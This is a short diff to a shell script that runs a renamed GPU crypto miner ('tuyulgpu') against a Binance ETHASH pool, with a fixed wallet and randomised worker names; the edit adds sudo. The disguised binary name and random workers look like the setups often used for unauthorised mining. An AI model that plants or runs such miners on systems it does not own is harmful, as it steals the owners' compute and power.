@@ -1,13 +1,3 @@
-
-
-POOL=ethash.poolbinance.com:1800
-
-WALLET=RHYTHM
-
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)#rame-kb3u
-
-chmod u+x tuyulgpu && ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY --keepfree 3
-
-
-
-
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
+chmod u+x tuyulgpu
+sudo ./tuyulgpu --algo ETHASH --pool ethash.poolbinance.com:1800 --user RHYTHM.$WORKER --ethstratum ETHPROXY --keepfree 2
